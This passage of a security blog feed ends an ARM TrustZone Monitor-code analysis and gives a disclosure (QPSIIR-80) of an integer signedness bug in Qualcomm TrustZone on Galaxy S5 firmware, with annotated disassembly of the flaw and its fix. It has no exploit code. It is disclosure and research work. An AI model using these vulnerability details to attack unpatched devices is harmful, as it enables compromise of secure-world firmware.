&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80D2DC&lt;/span&gt;                 &lt;span class="no"&gt;LDR&lt;/span&gt;             &lt;span class="no"&gt;R3&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="err"&gt;=&lt;/span&gt;&lt;span class="no"&gt;NS_core_status.SPSR&lt;/span&gt; &lt;span class="c1"&gt;; ptr to previously-saved Non-Secure CPSR&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80D2E0&lt;/span&gt;                 &lt;span class="no"&gt;LDR&lt;/span&gt;             &lt;span class="no"&gt;R3&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="no"&gt;R3&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80D2E4&lt;/span&gt;                 &lt;span class="no"&gt;BIC&lt;/span&gt;             &lt;span class="no"&gt;R3&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="no"&gt;R3&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="c1"&gt;#CPSR_MASK_FIQ ; clear CPSR.F: FIQ exceptions not masked&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80D2E8&lt;/span&gt;                 &lt;span class="no"&gt;MSR&lt;/span&gt;             &lt;span class="no"&gt;SPSR_cxsf&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="no"&gt;R3&lt;/span&gt; &lt;span class="c1"&gt;; write SPSR&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80D2EC&lt;/span&gt;                 &lt;span class="no"&gt;DMB&lt;/span&gt;             &lt;span class="no"&gt;SY&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;They will be used later for the exception return.&lt;/p&gt;
&lt;h5&gt;IV.3.B.e TrustZone lock&lt;/h5&gt;

&lt;p&gt;After that, tz_lock DWORD is cleared to indicate that this core is no longer running in TrustZone.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80D2F0&lt;/span&gt;                 &lt;span class="no"&gt;LDR&lt;/span&gt;             &lt;span class="no"&gt;R3&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="err"&gt;=&lt;/span&gt;&lt;span class="no"&gt;tz_lock&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80D2F4&lt;/span&gt;                 &lt;span class="no"&gt;MOV&lt;/span&gt;             &lt;span class="no"&gt;R2&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="c1"&gt;#0&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80D2F8&lt;/span&gt;                 &lt;span class="no"&gt;STR&lt;/span&gt;             &lt;span class="no"&gt;R2&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="no"&gt;R3&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="c1"&gt;; clear tz_lock&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80D2FC&lt;/span&gt;                 &lt;span class="no"&gt;DMB&lt;/span&gt;             &lt;span class="no"&gt;SY&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;h5&gt;IV.3.B.f Exception return to Non-Secure world&lt;/h5&gt;

&lt;p&gt;The MCR instruction writes to the SCR register to modify the
configuration of the current security state:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80D300&lt;/span&gt;                 &lt;span class="no"&gt;MOV&lt;/span&gt;             &lt;span class="no"&gt;R2&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="c1"&gt;#0  ; clear R2 to avoid leak&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80D304&lt;/span&gt;                 &lt;span class="no"&gt;MOV&lt;/span&gt;             &lt;span class="no"&gt;R3&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="c1"&gt;#0&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80D308&lt;/span&gt;                 &lt;span class="no"&gt;MOV&lt;/span&gt;             &lt;span class="no"&gt;R3&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="c1"&gt;#SCR_NS OR SCR_FIQ OR SCR_AW ; 0b100101&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80D30C&lt;/span&gt;                 &lt;span class="no"&gt;MCR&lt;/span&gt;             &lt;span class="no"&gt;p15&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="no"&gt;R3&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="no"&gt;c1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="no"&gt;c1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt; &lt;span class="c1"&gt;; write SCR : switch to Non-Secure state&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80D310&lt;/span&gt;                 &lt;span class="no"&gt;ISB&lt;/span&gt;             &lt;span class="no"&gt;SY&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80D314&lt;/span&gt;                 &lt;span class="no"&gt;MOV&lt;/span&gt;             &lt;span class="no"&gt;R3&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="c1"&gt;#0  ; clear R3 to avoid leak&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80D318&lt;/span&gt;                 &lt;span class="no"&gt;MOVS&lt;/span&gt;            &lt;span class="no"&gt;PC&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="no"&gt;LR&lt;/span&gt;  &lt;span class="c1"&gt;; restore Non-Secure PC &amp;amp; CPSR&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80D318&lt;/span&gt; &lt;span class="c1"&gt;; End of function smc_handler&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;The Security state is switched to Non-Secure (SCR_NS). FIQ
interrupts are taken to the Monitor Mode (SCR_FIQ), and the CPSR.A
bit can be modified in any security state (SCR_AW), so the
Non-Secure world can mask Abort exceptions.&lt;/p&gt;
&lt;p&gt;Finally, the exception return is made with a MOVS instruction which
branches to the return address in Normal World, and also copies
SPSR_mon to CPSR.&lt;/p&gt;
&lt;h2&gt;Conclusion&lt;/h2&gt;

&lt;p&gt;We have analyzed a part of Monitor code which allows to switch
processor security state through SMC exceptions. We've learnt that
some SMC exceptions are fully handled by Monitor code, while others
are routed to TrustZone code in Secure Supervisor mode. The latter
can be executed by only one core at a time. We have also found that
an external ELF can be loaded and executed in TrustZone with a
dedicated Secure memory space.
However, this analysis is not complete since IRQ &amp;amp; FIQ handlers
have not been studied.&lt;/p&gt;
&lt;p&gt;--&lt;em&gt;I would like to thank Adrien &amp;amp; Diane for their help!&lt;/em&gt;&lt;/p&gt;</content><category term="arm"></category><category term="security"></category><category term="qualcomm"></category><category term="firmware"></category><category term="android"></category><category term="nexus"></category><category term="trustzone"></category></entry><entry><title>[QPSIIR-80] Qualcomm TrustZone Integer Signedness bug</title><link href="https://fredericb.info/2014/12/qpsiir-80-qualcomm-trustzone-integer.html" rel="alternate"></link><published>2014-12-18T02:05:00-08:00</published><updated>2014-12-18T02:05:00-08:00</updated><author><name>Frédéric</name></author><id>tag:fredericb.info,2014-12-18:/2014/12/qpsiir-80-qualcomm-trustzone-integer.html</id><summary type="html">&lt;h2&gt;Summary&lt;/h2&gt;

&lt;div style="text-align: justify;"&gt;Qualcomm TrustZone is prone to an
integer signedness bug that may allow to write NULL words to barely
controllable locations in memory.&lt;br&gt;
&lt;br&gt;
The vulnerability can be triggered from Non-Secure World through
the TrustZone call "tzbsp_smmu_fault_regs_dump".&lt;br&gt;
&lt;br&gt;
This issue has been discovered in Samsung Galaxy S5 firmware, but
other devices can …&lt;/div&gt;</summary><content type="html">&lt;h2&gt;Summary&lt;/h2&gt;

&lt;div style="text-align: justify;"&gt;Qualcomm TrustZone is prone to an
integer signedness bug that may allow to write NULL words to barely
controllable locations in memory.&lt;br&gt;
&lt;br&gt;
The vulnerability can be triggered from Non-Secure World through
the TrustZone call "tzbsp_smmu_fault_regs_dump".&lt;br&gt;
&lt;br&gt;
This issue has been discovered in Samsung Galaxy S5 firmware, but
other devices can be affected as well.&lt;/div&gt;

&lt;h2&gt;Details&lt;/h2&gt;

&lt;div style="text-align: justify;"&gt;This vulnerability has been
discovered in TrustZone binary of Samsung Galaxy S5 firmware,
version 4.4.2.&lt;br&gt;
The tzbsp_smmu_fault_regs_dump function can be called from
Non-Secure World through the SMC instruction. It takes 4 arguments
passed in R0-R3 registers.&lt;br&gt;
When called with argument R0 &amp;gt; 1, nested function subfunc_1 is
called with arguments (R0 = 0xFFFFFFFF, R1) :&lt;/div&gt;

&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="nf"&gt;FE84B9B6&lt;/span&gt; &lt;span class="no"&gt;tzbsp_smmu_fault_regs_dump&lt;/span&gt;
&lt;span class="nf"&gt;FE84B9B6&lt;/span&gt;     &lt;span class="no"&gt;PUSH.W&lt;/span&gt;   &lt;span class="err"&gt;{&lt;/span&gt;&lt;span class="no"&gt;R4-R8&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="no"&gt;LR&lt;/span&gt;&lt;span class="err"&gt;}&lt;/span&gt;
&lt;span class="nf"&gt;FE84B9BA&lt;/span&gt;     &lt;span class="no"&gt;MOVS&lt;/span&gt;     &lt;span class="no"&gt;R6&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="no"&gt;R2&lt;/span&gt;
&lt;span class="nf"&gt;FE84B9BC&lt;/span&gt;     &lt;span class="no"&gt;MOV&lt;/span&gt;      &lt;span class="no"&gt;R8&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="no"&gt;R1&lt;/span&gt;
&lt;span class="nf"&gt;FE84B9BE&lt;/span&gt;     &lt;span class="no"&gt;MOV&lt;/span&gt;      &lt;span class="no"&gt;R7&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="no"&gt;R3&lt;/span&gt;
&lt;span class="nf"&gt;FE84B9C0&lt;/span&gt;     &lt;span class="no"&gt;MOV.W&lt;/span&gt;    &lt;span class="no"&gt;R4&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="c1"&gt;#0xFFFFFFFF&lt;/span&gt;
&lt;span class="nf"&gt;FE84B9C4&lt;/span&gt;     &lt;span class="no"&gt;MOV&lt;/span&gt;      &lt;span class="no"&gt;R5&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="c1"&gt;#0xFFFFFFEE&lt;/span&gt;
&lt;span class="nf"&gt;FE84B9C8&lt;/span&gt;     &lt;span class="no"&gt;BEQ&lt;/span&gt;      &lt;span class="no"&gt;loc_FE84BA1A&lt;/span&gt;
&lt;span class="nf"&gt;FE84B9CA&lt;/span&gt;     &lt;span class="no"&gt;CBZ&lt;/span&gt;      &lt;span class="no"&gt;R0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="no"&gt;loc_FE84B9D2&lt;/span&gt; &lt;span class="c1"&gt;; R0 &amp;gt; 1 : branch not taken&lt;/span&gt;
&lt;span class="nf"&gt;FE84B9CC&lt;/span&gt;     &lt;span class="no"&gt;CMP&lt;/span&gt;      &lt;span class="no"&gt;R0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="c1"&gt;#1&lt;/span&gt;
&lt;span class="nf"&gt;FE84B9CE&lt;/span&gt;     &lt;span class="no"&gt;BEQ&lt;/span&gt;      &lt;span class="no"&gt;loc_FE84B9D6&lt;/span&gt; &lt;span class="c1"&gt;; R0 &amp;gt; 1 : branch not taken&lt;/span&gt;
&lt;span class="nf"&gt;FE84B9D0&lt;/span&gt;     &lt;span class="no"&gt;B&lt;/span&gt;        &lt;span class="no"&gt;loc_FE84B9D8&lt;/span&gt; &lt;span class="c1"&gt;; branch&lt;/span&gt;
&lt;span class="nf"&gt;FE84B9D2&lt;/span&gt; &lt;span class="c1"&gt;; ---------------------------------------------------------&lt;/span&gt;
&lt;span class="nf"&gt;FE84B9D2&lt;/span&gt; &lt;span class="no"&gt;loc_FE84B9D2&lt;/span&gt;        &lt;span class="c1"&gt;; if R0 == 0&lt;/span&gt;
&lt;span class="nf"&gt;FE84B9D2&lt;/span&gt;     &lt;span class="no"&gt;MOVS&lt;/span&gt;     &lt;span class="no"&gt;R4&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="c1"&gt;#1&lt;/span&gt;
&lt;span class="nf"&gt;FE84B9D4&lt;/span&gt;     &lt;span class="no"&gt;B&lt;/span&gt;        &lt;span class="no"&gt;loc_FE84B9D8&lt;/span&gt;
&lt;span class="nf"&gt;FE84B9D6&lt;/span&gt; &lt;span class="c1"&gt;; ---------------------------------------------------------&lt;/span&gt;
&lt;span class="nf"&gt;FE84B9D6&lt;/span&gt; &lt;span class="no"&gt;loc_FE84B9D6&lt;/span&gt;        &lt;span class="c1"&gt;; if R0 == 1&lt;/span&gt;
&lt;span class="nf"&gt;FE84B9D6&lt;/span&gt;     &lt;span class="no"&gt;MOVS&lt;/span&gt;     &lt;span class="no"&gt;R4&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="c1"&gt;#0&lt;/span&gt;
&lt;span class="nf"&gt;FE84B9D8&lt;/span&gt;
&lt;span class="nf"&gt;FE84B9D8&lt;/span&gt; &lt;span class="no"&gt;loc_FE84B9D8&lt;/span&gt;        &lt;span class="c1"&gt;; for any value of R0&lt;/span&gt;
&lt;span class="nf"&gt;FE84B9D8&lt;/span&gt;     &lt;span class="no"&gt;MOVS&lt;/span&gt;     &lt;span class="no"&gt;R0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="c1"&gt;#1&lt;/span&gt;
&lt;span class="nf"&gt;FE84B9DA&lt;/span&gt;     &lt;span class="no"&gt;BL&lt;/span&gt;       &lt;span class="no"&gt;subfunc_0&lt;/span&gt; &lt;span class="c1"&gt;; kind of &amp;quot;is retail hardware?&amp;quot; test&lt;/span&gt;
&lt;span class="nf"&gt;FE84B9DE&lt;/span&gt;     &lt;span class="no"&gt;CBZ&lt;/span&gt;      &lt;span class="no"&gt;R0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="no"&gt;loc_FE84B9EE&lt;/span&gt; &lt;span class="c1"&gt;; not taken&lt;/span&gt;
&lt;span class="nf"&gt;FE84B9E0&lt;/span&gt;     &lt;span class="no"&gt;MOV&lt;/span&gt;      &lt;span class="no"&gt;R1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="no"&gt;R8&lt;/span&gt;
&lt;span class="nf"&gt;FE84B9E2&lt;/span&gt;     &lt;span class="no"&gt;MOV&lt;/span&gt;      &lt;span class="no"&gt;R0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="no"&gt;R4&lt;/span&gt; &lt;span class="c1"&gt;; R4 == #0xFFFFFFFF&lt;/span&gt;
&lt;span class="nf"&gt;FE84B9E4&lt;/span&gt;     &lt;span class="no"&gt;BL&lt;/span&gt;       &lt;span class="no"&gt;subfunc_1&lt;/span&gt;
&lt;span class="nf"&gt;FE84B9E8&lt;/span&gt;     &lt;span class="p"&gt;[...]&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;div style="text-align: justify;"&gt;Then subfunc_1 checks if R0 value
is valid. It will Branch and return if R0 is Greater than or Equal
to 2. However, BGE instruction operates on signed integers. So R0
== -1 &amp;lt; 2 will pass the test and the execution will continue
:&lt;/div&gt;

&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="nf"&gt;FE853124&lt;/span&gt; &lt;span class="no"&gt;subfunc_1&lt;/span&gt;
&lt;span class="nf"&gt;FE853124&lt;/span&gt;     &lt;span class="no"&gt;CMP&lt;/span&gt;      &lt;span class="no"&gt;R0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="c1"&gt;#2 ; R0 == #0xFFFFFFFF&lt;/span&gt;
&lt;span class="nf"&gt;FE853126&lt;/span&gt;     &lt;span class="no"&gt;BGE&lt;/span&gt;      &lt;span class="no"&gt;locret_FE85314C&lt;/span&gt; &lt;span class="c1"&gt;; signed comparison :&lt;/span&gt;
&lt;span class="nf"&gt;FE853126&lt;/span&gt;                              &lt;span class="c1"&gt;; R0(-1) &amp;lt; 2 so branch not taken&lt;/span&gt;
&lt;span class="nf"&gt;FE853128&lt;/span&gt;     &lt;span class="no"&gt;MOVW&lt;/span&gt;     &lt;span class="no"&gt;R2&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="c1"&gt;#0x9EE0&lt;/span&gt;
&lt;span class="nf"&gt;FE85312C&lt;/span&gt;     &lt;span class="no"&gt;ADD.W&lt;/span&gt;    &lt;span class="no"&gt;R3&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="no"&gt;R0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="no"&gt;R0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="no"&gt;LSL&lt;/span&gt;&lt;span class="c1"&gt;#1&lt;/span&gt;
&lt;span class="nf"&gt;FE853130&lt;/span&gt;     &lt;span class="no"&gt;MOVT.W&lt;/span&gt;   &lt;span class="no"&gt;R2&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="c1"&gt;#0xFE82&lt;/span&gt;
&lt;span class="nf"&gt;FE853134&lt;/span&gt;     &lt;span class="no"&gt;ADD.W&lt;/span&gt;    &lt;span class="no"&gt;R0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="no"&gt;R3&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="no"&gt;R0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="no"&gt;LSL&lt;/span&gt;&lt;span class="c1"&gt;#3&lt;/span&gt;
&lt;span class="nf"&gt;FE853138&lt;/span&gt;     &lt;span class="no"&gt;LDR&lt;/span&gt;      &lt;span class="no"&gt;R2&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="no"&gt;R2&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="c1"&gt;#(dword_FE829EE4 - 0xFE829EE0)]&lt;/span&gt;
&lt;span class="nf"&gt;FE85313A&lt;/span&gt;     &lt;span class="no"&gt;ADD.W&lt;/span&gt;    &lt;span class="no"&gt;R0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="no"&gt;R2&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="no"&gt;R0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="no"&gt;LSL&lt;/span&gt;&lt;span class="c1"&gt;#4&lt;/span&gt;
&lt;span class="nf"&gt;FE85313E&lt;/span&gt;     &lt;span class="no"&gt;LDRB&lt;/span&gt;     &lt;span class="no"&gt;R2&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="no"&gt;R0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="c1"&gt;#4]&lt;/span&gt;
&lt;span class="nf"&gt;FE853140&lt;/span&gt;     &lt;span class="no"&gt;CMP&lt;/span&gt;      &lt;span class="no"&gt;R2&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="no"&gt;R1&lt;/span&gt; &lt;span class="c1"&gt;; with R1 &amp;lt; R2&lt;/span&gt;
&lt;span class="nf"&gt;FE853142&lt;/span&gt;     &lt;span class="no"&gt;BLS&lt;/span&gt;      &lt;span class="no"&gt;locret_FE85314C&lt;/span&gt;
&lt;span class="nf"&gt;FE853144&lt;/span&gt;     &lt;span class="no"&gt;LDR&lt;/span&gt;      &lt;span class="no"&gt;R0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="no"&gt;R0&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
&lt;span class="nf"&gt;FE853146&lt;/span&gt;     &lt;span class="no"&gt;MOVS&lt;/span&gt;     &lt;span class="no"&gt;R2&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="c1"&gt;#0&lt;/span&gt;
&lt;span class="nf"&gt;FE853148&lt;/span&gt;     &lt;span class="no"&gt;B.W&lt;/span&gt;      &lt;span class="no"&gt;sub_FE856C84&lt;/span&gt; &lt;span class="c1"&gt;; write NULL DWORD to a barely arbitrary address (derived from R1 value)&lt;/span&gt;
&lt;span class="nf"&gt;FE85314C&lt;/span&gt;     &lt;span class="p"&gt;[...]&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;div style="text-align: justify;"&gt;Finally, the last nested function
could allow to write NULL words to a limited range of memory
locations.&lt;/div&gt;

&lt;h2&gt;Fix&lt;/h2&gt;

&lt;div style="text-align: justify;"&gt;This bug is fixed in Lolipop
version of the firmware. Several changes have been made. First,
subfunc_1 function is not reachable anymore with an invalid R0
value:&lt;/div&gt;

&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="nf"&gt;FE84B970&lt;/span&gt; &lt;span class="no"&gt;tzbsp_smmu_fault_regs_dump&lt;/span&gt;
&lt;span class="nf"&gt;FE84B970&lt;/span&gt;     &lt;span class="no"&gt;PUSH.W&lt;/span&gt;   &lt;span class="err"&gt;{&lt;/span&gt;&lt;span class="no"&gt;R4-R8&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="no"&gt;LR&lt;/span&gt;&lt;span class="err"&gt;}&lt;/span&gt;
&lt;span class="nf"&gt;FE84B974&lt;/span&gt;     &lt;span class="no"&gt;MOVS&lt;/span&gt;     &lt;span class="no"&gt;R6&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="no"&gt;R2&lt;/span&gt;
&lt;span class="nf"&gt;FE84B976&lt;/span&gt;     &lt;span class="no"&gt;MOV&lt;/span&gt;      &lt;span class="no"&gt;R8&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="no"&gt;R1&lt;/span&gt;
&lt;span class="nf"&gt;FE84B978&lt;/span&gt;     &lt;span class="no"&gt;MOV&lt;/span&gt;      &lt;span class="no"&gt;R7&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="no"&gt;R3&lt;/span&gt;
&lt;span class="nf"&gt;FE84B97A&lt;/span&gt;     &lt;span class="no"&gt;MOV&lt;/span&gt;      &lt;span class="no"&gt;R5&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="c1"&gt;#0xFFFFFFEE&lt;/span&gt;
&lt;span class="nf"&gt;FE84B97E&lt;/span&gt;     &lt;span class="no"&gt;BEQ&lt;/span&gt;      &lt;span class="no"&gt;loc_FE84B9D2&lt;/span&gt;
&lt;span class="nf"&gt;FE84B980&lt;/span&gt;     &lt;span class="no"&gt;CBZ&lt;/span&gt;      &lt;span class="no"&gt;R0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="no"&gt;loc_FE84B98A&lt;/span&gt;
&lt;span class="nf"&gt;FE84B982&lt;/span&gt;     &lt;span class="no"&gt;CMP&lt;/span&gt;      &lt;span class="no"&gt;R0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="c1"&gt;#1&lt;/span&gt;
&lt;span class="nf"&gt;FE84B984&lt;/span&gt;     &lt;span class="no"&gt;BEQ&lt;/span&gt;      &lt;span class="no"&gt;loc_FE84B98E&lt;/span&gt;
&lt;span class="nf"&gt;FE84B986&lt;/span&gt;     &lt;span class="no"&gt;ADDS&lt;/span&gt;     &lt;span class="no"&gt;R0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="no"&gt;R5&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="c1"&gt;#2&lt;/span&gt;
&lt;span class="nf"&gt;FE84B988&lt;/span&gt;     &lt;span class="no"&gt;B&lt;/span&gt;        &lt;span class="no"&gt;locret_FE84B7AA&lt;/span&gt; &lt;span class="c1"&gt;; branch if R0 &amp;gt; 1&lt;/span&gt;
&lt;span class="nf"&gt;FE84B98A&lt;/span&gt; &lt;span class="c1"&gt;; ---------------------------------------------------------&lt;/span&gt;
&lt;span class="nf"&gt;FE84B98A&lt;/span&gt; &lt;span class="no"&gt;loc_FE84B98A&lt;/span&gt;        &lt;span class="c1"&gt;; if R0 == 0&lt;/span&gt;
&lt;span class="nf"&gt;FE84B98A&lt;/span&gt;     &lt;span class="no"&gt;MOVS&lt;/span&gt;     &lt;span class="no"&gt;R4&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="c1"&gt;#1&lt;/span&gt;
&lt;span class="nf"&gt;FE84B98C&lt;/span&gt;     &lt;span class="no"&gt;B&lt;/span&gt;        &lt;span class="no"&gt;loc_FE84B990&lt;/span&gt;
&lt;span class="nf"&gt;FE84B98E&lt;/span&gt; &lt;span class="c1"&gt;; ---------------------------------------------------------&lt;/span&gt;
&lt;span class="nf"&gt;FE84B98E&lt;/span&gt; &lt;span class="no"&gt;loc_FE84B98E&lt;/span&gt;        &lt;span class="c1"&gt;; if R0 == 1&lt;/span&gt;
&lt;span class="nf"&gt;FE84B98E&lt;/span&gt;     &lt;span class="no"&gt;MOVS&lt;/span&gt;     &lt;span class="no"&gt;R4&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="c1"&gt;#0&lt;/span&gt;
&lt;span class="nf"&gt;FE84B990&lt;/span&gt;
&lt;span class="nf"&gt;FE84B990&lt;/span&gt; &lt;span class="no"&gt;loc_FE84B990&lt;/span&gt;        &lt;span class="c1"&gt;; if 0 &amp;lt;= R0 &amp;lt; 2&lt;/span&gt;
&lt;span class="nf"&gt;FE84B990&lt;/span&gt;     &lt;span class="no"&gt;MOVS&lt;/span&gt;     &lt;span class="no"&gt;R0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="c1"&gt;#1&lt;/span&gt;
&lt;span class="nf"&gt;FE84B992&lt;/span&gt;     &lt;span class="no"&gt;BL&lt;/span&gt;       &lt;span class="no"&gt;subfunc_0&lt;/span&gt; &lt;span class="c1"&gt;; kind of &amp;quot;is retail hardware?&amp;quot; test&lt;/span&gt;
&lt;span class="nf"&gt;FE84B996&lt;/span&gt;     &lt;span class="no"&gt;CBZ&lt;/span&gt;      &lt;span class="no"&gt;R0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="no"&gt;loc_FE84B9A6&lt;/span&gt; &lt;span class="c1"&gt;; not taken&lt;/span&gt;
&lt;span class="nf"&gt;FE84B998&lt;/span&gt;     &lt;span class="no"&gt;MOV&lt;/span&gt;      &lt;span class="no"&gt;R1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="no"&gt;R8&lt;/span&gt;
&lt;span class="nf"&gt;FE84B99A&lt;/span&gt;     &lt;span class="no"&gt;MOV&lt;/span&gt;      &lt;span class="no"&gt;R0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="no"&gt;R4&lt;/span&gt; &lt;span class="c1"&gt;; R4 is either 0 or 1&lt;/span&gt;
&lt;span class="nf"&gt;FE84B99C&lt;/span&gt;     &lt;span class="no"&gt;BL&lt;/span&gt;       &lt;span class="no"&gt;subfunc_1&lt;/span&gt;
&lt;span class="nf"&gt;FE84B9A0&lt;/span&gt;     &lt;span class="p"&gt;[...]&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;div style="text-align: justify;"&gt;Then in (sub)subfunc_1, R0 value
is now tested with an unsigned comparison:&lt;/div&gt;

